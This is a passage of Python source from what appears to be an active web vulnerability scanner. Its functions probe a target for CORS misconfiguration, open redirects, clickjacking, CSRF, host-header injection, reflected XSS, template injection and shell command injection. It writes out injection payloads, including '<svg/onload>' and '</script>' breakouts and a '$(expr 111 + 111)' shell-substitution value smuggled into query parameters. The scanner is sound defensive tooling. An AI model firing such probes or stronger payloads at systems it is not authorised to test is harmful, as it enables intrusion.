        ev["sensitive_data_labels"] = "; ".join(labels)
    return "medium"


def _check_cors(http: _Http, url: str) -> dict[str, Any] | None:
    parsed = urlparse(url)
    # The target's REAL origin (scheme + host + port) — an http:// target, or an https:// target
    # on an allowed non-default port, reflects origins prefixed with THAT, not a hardcoded
    # https://host, so build the control (and the substring probe) from the parsed origin.
    site_origin = f"{parsed.scheme}://{parsed.netloc}"
    try:
        probe = http.fetch(url, extra_headers={"Origin": _MARKER_ORIGIN})
        control = http.fetch(url, extra_headers={"Origin": site_origin})
    except _ActiveError:
        return None
    acao = (probe["headers"].get("access-control-allow-origin") or "").strip()
    acac = (probe["headers"].get("access-control-allow-credentials") or "").strip().lower()
    ctrl_acao = (control["headers"].get("access-control-allow-origin") or "").strip()
    # The app DYNAMICALLY reflects the Origin it's sent (it echoed the site origin back). A
    # substring/prefix-trusting ACL always reflects the host-containing control origin, so gating
    # the extra substring probe (variant 4) on this adds ZERO requests on an app that returns a
    # static/absent ACAO — keeping the request budget for the other checks.
    reflects_control = ctrl_acao == site_origin
    reflects_marker = acao == _MARKER_ORIGIN
    credentialed = acac == "true"
    # Confirmed: the response reflects the ATTACKER origin (not a static value/wildcard)
    # and allows credentials — a real cross-origin credentialed read. The control
    # (a different origin) reflecting differently proves it's Origin-driven.
    if reflects_marker and credentialed and ctrl_acao != acao:
        proof = _proof(
            "confirmed", method="GET with Origin: " + _MARKER_ORIGIN, affected_asset="authenticated cross-origin API responses",
            observed_result=f"Access-Control-Allow-Origin reflected the attacker origin ({acao}) with Allow-Credentials: true",
            control_result=f"a different Origin was reflected as {ctrl_acao} — reflection is attacker-controlled, not static",
            evidence=f"ACAO={acao}; ACAC={acac}",
        )
        ev = {"request_line": f"GET {url}", "request_header": f"Origin: {_MARKER_ORIGIN}",
              "response_status": f"HTTP {probe['status']}", "matched_value": f"Access-Control-Allow-Origin: {acao}; Access-Control-Allow-Credentials: {acac}"}
        tier = _cors_read_impact(http, probe, proof, ev)
        return _finding("active.cors-reflection", "CORS reflects attacker Origin with credentials", tier,
                        "cors", "cors", url, proof, ev, cvss=_cors_cvss(tier))
    if reflects_marker and not credentialed:
        proof = _proof("candidate", method="GET with attacker Origin",
                       observed_result=f"ACAO reflected {acao} but Allow-Credentials was not true",
                       limitations="Without Allow-Credentials, a credentialed cross-origin read is not proven.")
        ev = {"request_line": f"GET {url}", "request_header": f"Origin: {_MARKER_ORIGIN}", "response_status": f"HTTP {probe['status']}", "matched_value": f"ACAO: {acao}"}
        return _finding("active.cors-reflection", "CORS reflects arbitrary Origin (no credentials)", "low", "cors", "cors", url, proof, ev)

    # Variant 2 — Origin: null trusted with credentials (reachable from a sandboxed
    # iframe/data-URI). Confirm only when a DIFFERENT benign Origin does NOT also yield
    # null, so 'null' is genuinely attacker-reachable, not a static value.
    try:
        null_probe = http.fetch(url, extra_headers={"Origin": "null"})
    except _ActiveError:
        null_probe = None
    if null_probe is not None:
        n_acao = (null_probe["headers"].get("access-control-allow-origin") or "").strip()
        n_acac = (null_probe["headers"].get("access-control-allow-credentials") or "").strip().lower()
        if n_acao == "null" and n_acac == "true" and ctrl_acao != "null":
            proof = _proof(
                "confirmed", method="GET with Origin: null", affected_asset="authenticated API responses (readable from a sandboxed iframe / data: URI)",
                observed_result="Access-Control-Allow-Origin: null was returned with Allow-Credentials: true",
                control_result=f"a normal Origin was reflected as {ctrl_acao or '(none)'} — 'null' is specially trusted",
                evidence=f"ACAO=null; ACAC={n_acac}",
            )
            ev = {"request_line": f"GET {url}", "request_header": "Origin: null", "response_status": f"HTTP {null_probe['status']}",
                  "matched_value": "Access-Control-Allow-Origin: null; Access-Control-Allow-Credentials: true"}
            tier = _cors_read_impact(http, null_probe, proof, ev)
            return _finding("active.cors-reflection", "CORS trusts Origin: null with credentials", tier, "cors", "cors", url, proof, ev, cvss=_cors_cvss(tier))

    # Variant 3 — attacker-controlled subdomain of the in-scope host reflected with
    # credentials (a takeover/XSS on any sibling subdomain then reads this API).
    host = urlparse(url).hostname or ""
    if host:
        sub_origin = f"https://{_MARK}.{host}"
        try:
            sub_probe = http.fetch(url, extra_headers={"Origin": sub_origin})
        except _ActiveError:
            sub_probe = None
        if sub_probe is not None:
            s_acao = (sub_probe["headers"].get("access-control-allow-origin") or "").strip()
            s_acac = (sub_probe["headers"].get("access-control-allow-credentials") or "").strip().lower()
            if s_acao == sub_origin and s_acac == "true" and ctrl_acao != sub_origin:
                proof = _proof(
                    "confirmed", method=f"GET with Origin: {sub_origin}", affected_asset="authenticated API responses readable from any subdomain of the target",
                    observed_result=f"an arbitrary subdomain Origin ({sub_origin}) was reflected with Allow-Credentials: true",
                    control_result=f"a different Origin was reflected as {ctrl_acao or '(none)'} — any subdomain is trusted",
                    evidence=f"ACAO={sub_origin}; ACAC={s_acac}",
                )
                ev = {"request_line": f"GET {url}", "request_header": f"Origin: {sub_origin}", "response_status": f"HTTP {sub_probe['status']}",
                      "matched_value": f"Access-Control-Allow-Origin: {sub_origin}; Access-Control-Allow-Credentials: true"}
                tier = _cors_read_impact(http, sub_probe, proof, ev)
                return _finding("active.cors-reflection", "CORS trusts arbitrary subdomain Origin with credentials", tier, "cors", "cors", url, proof, ev, cvss=_cors_cvss(tier))

    # Variant 4 — naive substring/prefix trust: an ACL that checks `if TARGET in origin` (or a
    # `startswith` without a boundary) trusts `https://TARGET.attacker.example`. Send that shape;
    # if it's reflected with credentials and a different origin isn't, an attacker-owned domain
    # that merely CONTAINS the target host can read authenticated data.
    if host and reflects_control:
        substr_origin = f"{parsed.scheme}://{host}.{_MARKER_HOST}"
        try:
            substr_probe = http.fetch(url, extra_headers={"Origin": substr_origin})
        except _ActiveError:
            substr_probe = None
        if substr_probe is not None:
            b_acao = (substr_probe["headers"].get("access-control-allow-origin") or "").strip()
            b_acac = (substr_probe["headers"].get("access-control-allow-credentials") or "").strip().lower()
            if b_acao == substr_origin and b_acac == "true" and ctrl_acao != substr_origin:
                proof = _proof(
                    "confirmed", method=f"GET with Origin: {substr_origin}", affected_asset="authenticated API responses readable from an attacker domain that merely contains the target host",
                    observed_result=f"an origin containing the target host as a leading label ({substr_origin}) was reflected with Allow-Credentials: true",
                    control_result=f"a different Origin was reflected as {ctrl_acao or '(none)'} — the check trusts any origin whose string contains the host",
                    evidence=f"ACAO={substr_origin}; ACAC={b_acac}",
                )
                ev = {"request_line": f"GET {url}", "request_header": f"Origin: {substr_origin}", "response_status": f"HTTP {substr_probe['status']}",
                      "matched_value": f"Access-Control-Allow-Origin: {substr_origin}; Access-Control-Allow-Credentials: true"}
                tier = _cors_read_impact(http, substr_probe, proof, ev)
                return _finding("active.cors-reflection", "CORS trusts an origin that merely contains the host (substring/prefix trust)", tier, "cors", "cors", url, proof, ev, cvss=_cors_cvss(tier))
    return None


def _check_open_redirect(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    candidates = _redirect_candidates(url, extra_params, _REDIRECT_PARAMS, 3)
    for param in candidates:
        try:
            probe = http.fetch(_with_query(url, {param: _MARKER_ORIGIN + "/"}))
        except _ActiveError:
            continue
        location = (probe.get("location") or "").strip()
        if not location:
            continue
        # A protocol-relative Location ('//evil/') is a fully browser-exploitable open
        # redirect — one of the most common shapes — but carries no '://', so it must be
        # normalized (leading '//' -> 'https://') BEFORE host extraction, or urlparse
        # mis-parses 'http://x' + location into host='x' and never sees the real target.
        if location.startswith("//"):
            parse_target = "https:" + location
        elif "://" in location:
            parse_target = location
        else:
            parse_target = "http://x" + location
        loc_host = urlparse(parse_target).hostname or ""
        # Gate strictly on the parsed HOST equalling the marker (protocol-relative and absolute
        # forms are already normalized above, so loc_host is correct for both). The old
        # startswith(_MARKER_ORIGIN) / startswith('//'+marker) fallbacks lacked a host boundary,
        # so a redirect to the target's OWN subdomain whose label merely begins with the marker
        # (e.g. https://greyiq-marker.example.victim.com/) falsely reported a confirmed EXTERNAL
        # open redirect — a bogus, unsubmittable finding.
        if loc_host == _MARKER_HOST:
            try:
                control = http.fetch(_with_query(url, {param: "/greyiq-control"}))
            except _ActiveError:
                # The negative control is what proves the redirect target is attacker-supplied
                # (not a static redirect). If we could not observe it, an empty control must NOT
                # count as a passing differential — skip this candidate rather than confirm.
                continue
            ctrl_loc = (control.get("location") or "").strip()
            if _MARKER_HOST not in ctrl_loc:
                proof = _proof(
                    "confirmed", method=f"GET with {param}={_MARKER_ORIGIN}/", affected_asset="users following the link; tokens passed through the redirect",
                    observed_result=f"the server issued a {probe['status']} redirect to the external host via the '{param}' parameter (Location: {location})",
                    control_result=f"a same-origin '{param}' value redirected to {ctrl_loc or '(same origin)'} — the external host is attacker-supplied",
                    evidence=f"Location: {location}",
                )
                ev = {"request_line": f"GET {_with_query(url, {param: _MARKER_ORIGIN + '/'})}", "response_status": f"HTTP {probe['status']}",
                      # The off-host Location IS the proof — emit it as a real response-header line (wire
                      # order) so the reconstructed response shows it as a header, not only prose.
                      "response_header": f"Location: {location.strip()}"[:300],
                      "matched_value": f"redirect target {loc_host} (off-host) in the Location header"}
                return _finding("active.open-redirect", f"Open redirect via '{param}' parameter", "medium", "redirect", "redirect", url, proof, ev)
    return None


def _check_clickjacking(http: _Http, url: str, fetched: dict[str, Any] | None) -> dict[str, Any] | None:
    try:
        resp = fetched or http.fetch(url)
    except _ActiveError:
        return None
    headers = resp["headers"]
    xfo = headers.get("x-frame-options")
    csp = (headers.get("content-security-policy") or "").lower()
    framable = not xfo and "frame-ancestors" not in csp
    if not framable:
        return None
    # A header inspection proves the page is FRAMABLE, but not that a working
    # clickjacking attack exists (frame-busting JS / no sensitive action). With no
    # same-run differential to capture, this is an honest 'candidate', not confirmed.
    proof = _proof(
        "candidate", method="GET (response headers inspected)", affected_asset="users of the page (UI redress / clickjacking)",
        observed_result="the response sets neither X-Frame-Options nor a CSP frame-ancestors directive, so the page is framable",
        limitations="Framability is shown from headers; a working clickjacking attack is not yet proven.",
        proof_obligation="Build a minimal HTML page that frames the target and show a sensitive action is clickable through the overlay.",
        evidence="X-Frame-Options: (absent); CSP frame-ancestors: (absent)",
    )
    ev = {"request_line": f"GET {url}", "response_status": f"HTTP {resp['status']}", "matched_value": "no X-Frame-Options, no CSP frame-ancestors"}
    return _finding("active.clickjacking", "Page is framable (clickjacking candidate)", "low", "headers", "headers", url, proof, ev)


_FORM_RE = re.compile(r"<form\b[^>]*>.*?</form>", re.IGNORECASE | re.DOTALL)
_METHOD_POST_RE = re.compile(r"method\s*=\s*[\"']?\s*post", re.IGNORECASE)
# Anti-CSRF token field names (hidden input) or a page-wide meta token.
_CSRF_TOKEN_RE = re.compile(
    r"name\s*=\s*[\"']?(?:[a-z0-9_\-]*x?csrf[a-z0-9_\-]*|authenticity_token|"
    r"__requestverificationtoken|_token|anti[\-_]?forgery[a-z]*|nonce)",
    re.IGNORECASE,
)
_META_CSRF_RE = re.compile(r"<meta[^>]+name\s*=\s*[\"']csrf-token[\"']", re.IGNORECASE)


def _check_csrf(landing: dict[str, Any] | None, url: str) -> dict[str, Any] | None:
    """Candidate-grade CSRF: a state-changing POST form served with NO anti-CSRF token.
    Passive (GET, form inspection). Honest tiering — modern browsers default cookies to
    SameSite=Lax, which already blocks cross-site POST, so a missing token alone is rarely
    exploitable. A tokenless POST form whose session cookie is explicitly ``SameSite=None``
    is a MEDIUM candidate; if a Lax/Strict cookie is observed it's skipped (protected);
    otherwise a LOW candidate the operator must verify."""
    if not landing:
        return None
    body = landing.get("body") or ""
    if _META_CSRF_RE.search(body):
        return None  # a page-wide CSRF meta token (AJAX frameworks attach it to POSTs)
    tokenless = any(
        _METHOD_POST_RE.search(m.group(0)) and not _CSRF_TOKEN_RE.search(m.group(0))
        for m in _FORM_RE.finditer(body)
    )
    if not tokenless:
        return None
    # Evaluate SameSite PER COOKIE on the session-looking cookie(s), not a global substring over all
    # cookies joined: otherwise an unrelated SameSite=None tracker alongside a SameSite=Lax session
    # cookie would defeat the "protected" skip and wrongly report CSRF on an actually-protected session.
    raw_cookies = [str(c) for c in (landing.get("cookies") or [])]
    _session_re = re.compile(r"(session|sess|sid|auth|token|jwt|login|user|connect\.sid|phpsessid|jsessionid|asp\.net)", re.IGNORECASE)
    def _samesite(cookie: str) -> str:
        m = re.search(r"samesite\s*=\s*(none|lax|strict)", cookie, re.IGNORECASE)
        return m.group(1).lower() if m else ""
    session_cookies = [c for c in raw_cookies if _session_re.search(c.split("=", 1)[0])]
    consider = session_cookies or raw_cookies  # if no session cookie is identifiable, stay conservative over all
    samesite_none = any(_samesite(c) == "none" for c in consider)          # a session cookie usable cross-site
    samesite_lax_strict = any(_samesite(c) in ("lax", "strict") for c in consider)
    if samesite_lax_strict and not samesite_none:
        return None  # the session cookie is SameSite Lax/Strict -> cross-site POST blocked
    sev = "medium" if samesite_none else "low"
    proof = _proof(
        "candidate", method="GET (passive form inspection)",
        affected_asset="authenticated users tricked into submitting this form cross-site",
        observed_result="a state-changing POST form is served with no anti-CSRF token field",
        limitations=("Browsers default cookies to SameSite=Lax, which blocks cross-site POST; a missing token is only "
                     "exploitable if the session cookie is SameSite=None or the action is otherwise reachable cross-site. "
                     + ("A response cookie is set SameSite=None (cross-site cookies allowed)."
                        if samesite_none else "The session cookie's SameSite policy was not observed here — verify it.")),
        proof_obligation="Host a page that auto-submits a forged cross-site POST with the victim's cookies and confirm the state change.",
        evidence="<form method=post> with no csrf/xsrf/authenticity_token field" + ("; Set-Cookie SameSite=None" if samesite_none else ""),
    )
    ev = {"request_line": f"GET {url}", "matched_value": "POST form with no anti-CSRF token" + ("; a cookie is SameSite=None" if samesite_none else "")}
    return _finding("active.csrf-missing-token", "State-changing form without anti-CSRF token", sev, "csrf", "csrf", url, proof, ev)


def _check_host_header(http: _Http, url: str) -> dict[str, Any] | None:
    # Reverse proxies / CDNs commonly PIN the real Host but trust X-Forwarded-Host for building
    # absolute URLs (the classic password-reset-poisoning vector) — so a raw Host probe misses
    # every app behind such a proxy. Probe raw Host first, then X-Forwarded-Host only if the raw
    # Host wasn't reflected. The proxy overrides Host before the app sees it, so XFH is the shape
    # that actually reaches the modern app.
    probe_header = "Host"
    try:
        probe = http.fetch(url, extra_headers={"Host": _MARKER_HOST})
    except _ActiveError:
        return None
    location = probe.get("location") or ""
    body = probe.get("body") or ""
    if _MARKER_HOST not in location and _MARKER_HOST not in body:
        try:
            xfh = http.fetch(url, extra_headers={"X-Forwarded-Host": _MARKER_HOST})
        except _ActiveError:
            return None
        location = xfh.get("location") or ""
        body = xfh.get("body") or ""
        if _MARKER_HOST not in location and _MARKER_HOST not in body:
            return None
        probe, probe_header = xfh, "X-Forwarded-Host"
    try:
        control = http.fetch(url)
    except _ActiveError:
        # The negative control (real Host) is the FP suppressor that proves the marker is
        # header-driven and not already present under the real Host. Without observing it we
        # cannot confirm — bail rather than treat an empty control as a passing differential.
        return None
    if _MARKER_HOST in (control.get("location") or "") or _MARKER_HOST in (control.get("body") or ""):
        return None  # marker present without our header → not header-driven
    in_location = _MARKER_HOST in location
    where = "Location header" if in_location else "response body"
    if in_location:
        # Reflected into a redirect Location is genuinely actionable (password-reset
        # poisoning, cache poisoning) — confirmed.
        proof = _proof(
            "confirmed", method=f"GET with {probe_header}: {_MARKER_HOST}", affected_asset="absolute links / redirects (password-reset poisoning, cache poisoning)",
            observed_result=f"the attacker-supplied {probe_header} header was reflected into the Location header",
            control_result="the real Host did not produce the marker — the value is attacker-controlled",
            evidence=f"marker host echoed in the Location header (via {probe_header})",
        )
        sev = "medium"
    else:
        # Body-only reflection is extremely common and usually harmless — candidate.
        proof = _proof(
            "candidate", method=f"GET with {probe_header}: {_MARKER_HOST}",
            observed_result=f"the attacker-supplied {probe_header} header was reflected into the response body",
            control_result="the real Host did not produce the marker — the value is attacker-controlled",
            limitations="Body-only reflection is common and usually harmless; it is actionable only where that value builds a security-relevant absolute URL (e.g. a password-reset link) or a cacheable response.",
            proof_obligation="Show the reflected host lands in a password-reset/confirmation link or a cacheable response — not just printed in the page.",
        )
        sev = "low"
    ev = {"request_line": f"GET {url}", "request_header": f"{probe_header}: {_MARKER_HOST}", "response_status": f"HTTP {probe['status']}",
          "matched_value": f"{_MARKER_HOST} in {where}",
          # The ACTUAL reflected value in context — the marker host as it landed in the Location
          # header / body, so the report shows where the attacker input surfaced, not just that it did.
          "read_data": _context_excerpt(location if in_location else body, _MARKER_HOST)}
    if in_location:
        ev["response_header"] = f"Location: {location.strip()}"[:300]
    return _finding("active.host-header-injection", "Host / X-Forwarded-Host reflected (host-header injection)", sev, "redirect", "redirect", url, proof, ev)


def _context_excerpt(body: str, needle: str, pad: int = 140) -> str:
    """A window of the response around ``needle`` — the payload IN CONTEXT (the actual reflected
    HTML / evaluated expression / SQL error the server returned), which is the concrete proof a
    triager wants instead of a prose description. Raw here; _finding() redacts it exactly once."""
    idx = str(body or "").find(needle)
    if idx < 0:
        return ""
    return body[max(0, idx - pad): idx + len(needle) + pad]


def _check_reflected_xss(http: _Http, url: str, extra_params: list[str] | None = None,
                         priority: list[str] | None = None) -> dict[str, Any] | None:
    params = _candidate_params(url, extra_params, _XSS_PARAMS, 3, priority=priority)
    marker_payload = f"{_MARK}<svg/onload=1>"
    for param in params:
        try:
            probe = http.fetch(_with_query(url, {param: marker_payload}))
            control = http.fetch(_with_query(url, {param: _MARK}))
        except _ActiveError:
            continue
        body, ctrl_body = probe.get("body") or "", control.get("body") or ""
        ctype = (probe["headers"].get("content-type") or "").lower()
        html_context = (not ctype) or "html" in ctype or "xml" in ctype
        # Confirmed: the special-char payload reflects UNESCAPED (a real injection
        # point), the plain marker reflects in the control (the param is echoed, ruling
        # out a coincidental match), AND the response is HTML-renderable — a verbatim
        # reflection into application/json or text/plain is not browser-executable.
        # We INSPECT the string; nothing executes.
        if marker_payload in body and _MARK in ctrl_body and f"{_MARK}&lt;" not in body and html_context:
            if _in_nonexecuting_context(body, body.find(marker_payload)):
                # Reflected into RCDATA/raw-text (<title>, <textarea>, …) or an HTML comment — the
                # <svg/onload> is inert text there, so this is not a confirm-grade injection.
                continue
            proof = _proof(
                "confirmed", method=f"GET with {param}={marker_payload}", affected_asset="victim sessions/cookies and any action the victim can take",
                observed_result=f"the '{param}' parameter reflected the payload UNESCAPED into the response (the `<svg/onload>` markup was not HTML-encoded)",
                control_result=f"a plain marker reflected too, confirming '{param}' is echoed — the difference is the unescaped special characters",
                evidence="reflected payload appears raw (not entity-encoded) in the response body",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: marker_payload})}", "response_status": f"HTTP {probe['status']}",
                  "matched_value": "unescaped reflection of <svg/onload=...>",
                  # The ACTUAL response excerpt showing the payload reflected raw into the HTML — the
                  # concrete proof a triager needs, not just a description of it.
                  "read_data": _context_excerpt(body, marker_payload)}
            return _finding("active.reflected-xss", f"Reflected XSS via '{param}' parameter", "high", "client_sink", "xss", url, proof, ev)
    return None


# Elements whose content the browser parses as raw text / RCDATA, not markup — a reflected
# ``<svg/onload>`` inside one of these (or inside an HTML comment) is inert text, never executed.
_RAW_TEXT_ELEMENTS = ("script", "style", "title", "textarea", "xmp", "noscript", "noframes", "iframe")


def _in_nonexecuting_context(body: str, idx: int) -> bool:
    """True if position ``idx`` sits somewhere a reflected ``<svg/onload>`` does NOT execute as HTML:
    inside an HTML comment, or inside a raw-text/RCDATA element (<script>, <style>, <title>,
    <textarea>, <xmp>, <noscript>, <noframes>, <iframe>) whose content is treated as text. The
    element-content reflected-XSS check must land in an EXECUTING context to be confirm-grade; a
    reflection into <title>/<textarea>/a comment is a false confirm."""
    if idx < 0:
        return False
    before = body[:idx].lower()
    # HTML comment: the nearest '<!--' before idx has no closing '-->' between it and idx.
    c_open = before.rfind("<!--")
    if c_open >= 0 and before.rfind("-->") < c_open:
        return True
    # Raw-text / RCDATA element: the nearest opening such tag before idx is unclosed.
    for tag in _RAW_TEXT_ELEMENTS:
        open_i = before.rfind(f"<{tag}")
        if open_i >= 0 and open_i > before.rfind(f"</{tag}"):
            return True
    return False


def _in_script_context(body: str, idx: int) -> bool:
    """True if position ``idx`` sits inside an OPEN ``<script>…</script>`` element — the nearest
    script tag before it is an opening one with no intervening close. (Browsers terminate a script
    element on a literal ``</script>`` even inside a JS string, so a reflected raw ``</script>`` here
    is a real breakout.)"""
    if idx < 0:
        return False
    before = body[:idx].lower()
    open_i = before.rfind("<script")
    return open_i >= 0 and open_i > before.rfind("</script>")


def _in_double_quoted_attr(body: str, idx: int) -> bool:
    """True if ``idx`` sits inside a double-quoted attribute value of an open HTML tag (an unclosed
    ``<`` precedes it and an odd number of ``"`` lie between that ``<`` and ``idx``)."""
    if idx < 0:
        return False
    before = body[:idx]
    lt = before.rfind("<")
    if lt < 0 or lt < before.rfind(">"):
        return False  # not inside an open tag
    return before[lt:].count('"') % 2 == 1  # odd quotes => currently inside a "…" value


def _check_reflected_xss_context(http: _Http, url: str, extra_params: list[str] | None = None,
                                 priority: list[str] | None = None) -> dict[str, Any] | None:
    """Reflected XSS in a JS-string or HTML-attribute context that the element-content check (which
    needs a raw ``<svg/onload>``) cannot confirm: the app HTML-encodes ``<`` but leaves ``</script>``
    or a ``"`` unescaped, so the payload still breaks out. Confirmed ONLY when the breakout chars
    reflect UNENCODED *and* the reflection physically sits inside a ``<script>`` element / a double-
    quoted attribute (verified from the surrounding syntax) — a real, browser-executable differential.
    Runs after the element-content check, so it only spends budget when that one didn't fire."""
    params = _candidate_params(url, extra_params, _XSS_PARAMS, 2, priority=priority)
    for param in params:
        try:
            control = http.fetch(_with_query(url, {param: _MARK}))
        except _ActiveError:
            continue
        if _MARK not in (control.get("body") or ""):
            continue  # the param is not echoed at all — nothing to break out of
        # 1) JS-string context: a </script> breakout. The browser closes the script element even
        #    inside a JS string literal, so whatever follows becomes live HTML.
        js_payload = f"{_MARK}</script>"
        try:
            probe = http.fetch(_with_query(url, {param: js_payload}))
        except _ActiveError:
            continue
        body = probe.get("body") or ""
        ctype = (probe["headers"].get("content-type") or "").lower()
        if not ((not ctype) or "html" in ctype or "xml" in ctype):
            continue  # a reflection into JSON/plain text is not browser-executable
        idx = body.find(js_payload)  # requires the raw </script> to survive un-encoded
        if idx >= 0 and _in_script_context(body, idx):
            proof = _proof(
                "confirmed", method=f"GET with {param}={js_payload}", affected_asset="victim sessions/cookies and any action the victim can take",
                observed_result=f"the '{param}' parameter reflected a raw '</script>' UNENCODED inside a <script> block — the script element is terminated and attacker markup follows (browser-executable XSS)",
                control_result="a plain marker reflected too, confirming the param is echoed — the difference is the unescaped '</script>' breakout",
                evidence="a literal </script> from the parameter appears inside a script element in the response",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: js_payload})}", "response_status": f"HTTP {probe['status']}",
                  "matched_value": "unescaped </script> breakout inside a <script> block",
                  "read_data": _context_excerpt(body, js_payload)}
            return _finding("active.reflected-xss", f"Reflected XSS via '{param}' (JavaScript-context breakout)", "high", "client_sink", "xss", url, proof, ev)
        # 2) Attribute context: a double-quote breakout of a "…"-quoted attribute value.
        attr_payload = f'{_MARK}"'
        try:
            aprobe = http.fetch(_with_query(url, {param: attr_payload + "x"}))
        except _ActiveError:
            continue
        abody = aprobe.get("body") or ""
        actype = (aprobe["headers"].get("content-type") or "").lower()
        if not ((not actype) or "html" in actype or "xml" in actype):
            continue
        aidx = abody.find(attr_payload)  # the marker immediately followed by a RAW "
        if aidx >= 0 and f"{_MARK}&quot;" not in abody and f"{_MARK}&#34;" not in abody and _in_double_quoted_attr(abody, aidx):
            proof = _proof(
                "confirmed", method=f'GET with {param}={attr_payload}x', affected_asset="victim sessions/cookies and any action the victim can take",
                observed_result=f"the '{param}' parameter reflected a raw double-quote UNENCODED inside a double-quoted HTML attribute — the quote closes the attribute, allowing a new attribute/handler to be injected",
                control_result="a plain marker reflected too, confirming the param is echoed — the difference is the unescaped '\"' that breaks out of the attribute",
                evidence="a literal double-quote from the parameter closes the surrounding attribute value in the response",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: attr_payload + 'x'})}", "response_status": f"HTTP {aprobe['status']}",
                  "matched_value": "unescaped double-quote breakout of a quoted HTML attribute",
                  "read_data": _context_excerpt(abody, attr_payload)}
            return _finding("active.reflected-xss", f"Reflected XSS via '{param}' (attribute-context breakout)", "high", "client_sink", "xss", url, proof, ev)
    return None


def _check_ssti(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    params = _candidate_params(url, extra_params, _SSTI_PARAMS, 3)
    # Probe the common template engines in ONE request — each 7*7 expression tagged with its OWN
    # adjacent marker so an evaluated 49 is unambiguous, attributable to the engine, and can't
    # coincide with page text. Covers Jinja/Twig, Freemarker/JSP-EL, ERB/EJS, Thymeleaf/Ruby.
    _engines = (("Jinja/Twig", "{{7*7}}"), ("Freemarker/JSP-EL", "${7*7}"),
                ("ERB/EJS", "<%= 7*7 %>"), ("Thymeleaf/Ruby", "#{7*7}"))
    probe_payload = "".join(f"{_MARK}{i}{expr}" for i, (_n, expr) in enumerate(_engines, 1))
    control_payload = "".join(f"{_MARK}{i}7*7" for i in range(1, len(_engines) + 1))
    signatures = [(name, f"{_MARK}{i}49") for i, (name, _e) in enumerate(_engines, 1)]
    for param in params:
        try:
            probe = http.fetch(_with_query(url, {param: probe_payload}))
            control = http.fetch(_with_query(url, {param: control_payload}))
        except _ActiveError:
            continue
        body, ctrl_body = probe.get("body") or "", control.get("body") or ""
        # Confirmed: an engine EVALUATED one of the expressions to 49 immediately after its
        # unique marker (server-side execution), and the literal-arithmetic control did NOT yield
        # marker+49 (rules out a coincidental '49'). We only INSPECT strings; the arithmetic is
        # evaluated by the target's own engine — no file read, no code, no RCE payload.
        hit = next(((name, sig) for name, sig in signatures if sig in body and sig not in ctrl_body), None)
        if hit:
            engine, sig = hit
            proof = _proof(
                "confirmed", method=f"GET with {param}=<multi-engine 7*7 template probe>",
                affected_asset="the server-side template/rendering context (a path to RCE on many engines)",
                observed_result=f"the '{param}' parameter's {engine} template expression was evaluated to 49 by the server-side engine",
                control_result="a literal '7*7' control did NOT produce 49 — proving the engine evaluated the expression rather than echoing it",
                evidence=f"the marker immediately followed by the evaluated result ({sig}) appears in the response body",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: probe_payload})}", "response_status": f"HTTP {probe['status']}",
                  "matched_value": f"template expression evaluated to 49 ({engine})",
                  "read_data": _context_excerpt(body, sig)}  # the response showing 7*7 evaluated to 49
            return _finding("active.ssti", f"Server-side template injection via '{param}' parameter", "high", "injection", "ssti", url, proof, ev)
    return None


def _check_rce_command_injection(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Confirm OS command injection with a BENIGN shell-substitution arithmetic probe: if the
    parameter reaches a shell, ``$(expr 111 + 111)`` / `` `expr 111 + 111` `` is evaluated and its
    result (222) echoed back. Only ``expr`` runs — no real command, no side effect. A literal
    control that is NOT substituted rules out a coincidental echo. GET-only; one marker per probe.
    This is the arithmetic-echo sibling of the SSTI check, for a shell context rather than a
    template engine — the safe way to prove RCE without executing a real payload."""
    params = _candidate_params(url, extra_params, _RCE_PARAMS, 3)
    # BOTH substitution forms ($(...) and backticks) ride in ONE probe, each behind its own
    # marker — so this check costs exactly what SSTI does: one control + one probe per param.
    sig_dollar, sig_tick = f"{_MARK}D222", f"{_MARK}T222"
    probe_payload = f"{_MARK}D$(expr 111 + 111){_MARK}T`expr 111 + 111`"
    control_payload = f"{_MARK}Dexpr 111 + 111{_MARK}Texpr 111 + 111"
    for param in params:
        try:
            control = http.fetch(_with_query(url, {param: control_payload}))
        except _ActiveError:
            continue
        cbody = control.get("body") or ""
        if sig_dollar in cbody or sig_tick in cbody:
            continue  # the literal already yields the signature -> not substitution-driven
        try:
            probe = http.fetch(_with_query(url, {param: probe_payload}))
        except _ActiveError:
            # Skip THIS parameter, not the rest of them. _ActiveError is a transient network failure
            # (budget exhaustion raises _RateLimited, which the caller handles), and the control fetch
            # above already `continue`s on the same error — so breaking here threw away every remaining
            # candidate because one probe hit a reset. Its SSTI sibling continues; so does this now.
            continue
        body = probe.get("body") or ""
        if sig_dollar in body or sig_tick in body:
            hit_sig = sig_dollar if sig_dollar in body else sig_tick
            form = "$(expr 111 + 111)" if sig_dollar in body else "`expr 111 + 111`"
            proof = _proof(
                "confirmed", method=f"GET with {param}=<benign {form} shell substitution>",
                affected_asset="the application server — arbitrary OS command execution in the query's shell context",
                observed_result=f"the '{param}' parameter's shell substitution {form} was evaluated by a server-side shell (→ 222) — OS command injection",
                control_result="a literal 'expr 111 + 111' control did NOT yield 222 — the shell evaluated the substitution, it wasn't echoed",
                evidence="the marker immediately followed by the evaluated result (222) appears in the response body",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: probe_payload})}", "response_status": f"HTTP {probe['status']}",
                  "matched_value": "shell command substitution evaluated to 222 (OS command injection)",
                  # The ACTUAL response excerpt showing the shell-evaluated 222 next to its marker — the
                  # concrete proof a triager needs for a CRITICAL RCE, not merely a description of it.
                  "read_data": _context_excerpt(body, hit_sig)}
            return _finding("active.rce-command-injection", f"OS command injection via '{param}' parameter",
                            "critical", "injection", "rce", url, proof, ev)
    return None


# Quote-break variants: a single quote breaks a '…' string literal; a double quote breaks a "…"
# literal (common in MySQL/MSSQL and quoted identifiers); a lone backslash can break an escaped-
# string context. Each is a benign one-character perturbation — the DB-error-banner-only gate keeps
# every variant false-positive-proof (a generic stack trace never confirms; only a real DB banner).
_SQLI_QUOTE_VARIANTS: tuple[tuple[str, str], ...] = (("'", "a single quote"), ('"', "a double quote"), ("\\", "a backslash"))


def _check_error_sqli(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 3)
    if not params:
